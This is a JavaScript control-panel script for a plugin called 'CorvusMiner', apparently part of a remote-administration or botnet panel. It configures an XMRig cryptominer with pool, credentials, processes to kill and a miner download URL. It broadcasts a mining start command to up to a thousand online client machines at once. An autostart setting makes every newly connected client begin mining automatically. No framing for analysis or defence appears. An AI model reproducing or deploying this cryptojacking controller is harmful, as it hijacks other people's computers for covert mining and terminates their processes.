(() => {
const params = new URLSearchParams(window.location.search);
const logEl = document.getElementById("log");
const poolInput = document.getElementById("pool");
const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");
const threadsHintInput = document.getElementById("threads-hint");
const killProcessesInput = document.getElementById("kill-processes");
const xmrigUrlInput = document.getElementById("xmrig-url");
const startMiningBtn = document.getElementById("start-mining-btn");
const stopMiningBtn = document.getElementById("stop-mining-btn");
const autostartToggle = document.getElementById("autostart-toggle");
const autostartStatus = document.getElementById("autostart-status");

const pluginId = "corvusminer";
const clientId = params.get("clientId") || "";
const CONFIG_URL = `/api/plugins/${pluginId}/data/config.json`;
const AUTOLOAD_URL = `/api/plugins/${pluginId}/autoload`;

function log(line) {
  const ts = new Date().toISOString();
  logEl.textContent = `${ts} ${line}\n` + logEl.textContent;
}

function buildMiningPayload() {
  const pool         = poolInput.value.trim();
  const username     = usernameInput.value.trim();
  const password     = passwordInput.value.trim();
  const threads_hint = parseInt(threadsHintInput.value) || 100;
  const kill_processes = killProcessesInput.value.trim()
    .split(/[,;\s]+/).filter(p => p.length > 0);
  const xmrig_url = xmrigUrlInput.value.trim();
  return { pool, username, password: password || "x", threads_hint, kill_processes, xmrig_url };
}

async function loadConfig() {
  try {
    const res = await fetch(CONFIG_URL);
    if (!res.ok) return;
    const cfg = await res.json();
    if (cfg.pool)         poolInput.value         = cfg.pool;
    if (cfg.username)     usernameInput.value      = cfg.username;
    if (cfg.password)     passwordInput.value      = cfg.password;
    if (cfg.threads_hint != null) threadsHintInput.value = cfg.threads_hint;
    if (Array.isArray(cfg.kill_processes) && cfg.kill_processes.length)
      killProcessesInput.value = cfg.kill_processes.join(", ");
    if (cfg.xmrig_url) xmrigUrlInput.value = cfg.xmrig_url;
    log("Config loaded from server");
  } catch (err) {
    log(`Config load error: ${err.message}`);
  }
}

async function saveConfig(payload) {
  try {
    await fetch(CONFIG_URL, {
      method: "PUT",
      headers: { "Content-Type": "application/octet-stream" },
      body: JSON.stringify(payload, null, 2),
    });
  } catch (err) {
    log(`Config save error: ${err.message}`);
  }
}

async function loadAutoloadState() {
  try {
    const res = await fetch("/api/plugins");
    if (!res.ok) return;
    const { plugins } = await res.json();
    const entry = (plugins || []).find(p => p.id === pluginId);
    if (!entry) return;
    autostartToggle.checked = !!entry.autoLoad;
    autostartStatus.textContent = entry.autoLoad
      ? "Autostart is ON — new clients will start mining automatically"
      : "Autostart is off";
  } catch (err) {
    log(`Autoload state load error: ${err.message}`);
  }
}

async function setAutoload(enabled) {
  const body = enabled
    ? {
        autoLoad: true,
        autoStartEvents: [
          { event: "mining_start", payload: buildMiningPayload() }
        ]
      }
    : { autoLoad: false };

  try {
    const res = await fetch(AUTOLOAD_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    if (!res.ok) {
      log(`Autoload update failed: ${res.status}`);
      autostartToggle.checked = !enabled; // revert
      return;
    }
    autostartStatus.textContent = enabled
      ? "Autostart is ON — new clients will start mining automatically"
      : "Autostart is off";
    log(`Autostart ${enabled ? "enabled" : "disabled"}`);
  } catch (err) {
    log(`Autoload error: ${err.message}`);
    autostartToggle.checked = !enabled;
  }
}

async function sendEventToAllClients(event, payload) {
  try {
    const res = await fetch("/api/clients?status=online&pageSize=1000");
    if (!res.ok) { log(`Failed to fetch clients: ${res.status}`); return; }
    const { items } = await res.json();
    const onlineIds = items.filter(c => c.online).map(c => c.id);

    if (!onlineIds.length) { log("No online clients found"); return; }

    log(`Broadcasting "${event}" to ${onlineIds.length} online client(s)...`);

    let success = 0, failed = 0;
    for (const cid of onlineIds) {
      const r = await fetch(`/api/clients/${encodeURIComponent(cid)}/plugins/${pluginId}/event`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ event, payload }),
      });
      if (r.ok) { success++; log(`  ✓ ${cid}`); }
      else      { failed++;  log(`  ✗ ${cid} (${r.status})`); }
    }
    log(`Broadcast complete: ${success} success, ${failed} failed`);
  } catch (err) {
    log(`Broadcast error: ${err.message}`);
  }
}

startMiningBtn.addEventListener("click", () => {
  const payload = buildMiningPayload();
  if (!payload.pool || !payload.username) { log("Pool and Username are required"); return; }
  saveConfig(payload);
  /* If autostart is on, refresh the autoStartEvents with the new config too */
  if (autostartToggle.checked) setAutoload(true);
  sendEventToAllClients("mining_start", payload);
});

stopMiningBtn.addEventListener("click", () => {
  sendEventToAllClients("mining_stop", {});
});

autostartToggle.addEventListener("change", () => {
  if (autostartToggle.checked) {
    const payload = buildMiningPayload();
    if (!payload.pool || !payload.username) {
      log("Set Pool and Username before enabling autostart");
      autostartToggle.checked = false;
      return;
    }
    saveConfig(payload);
  }
  setAutoload(autostartToggle.checked);
});

loadConfig();
loadAutoloadState();
log("Ready — CorvusMiner (global broadcast)");
})();
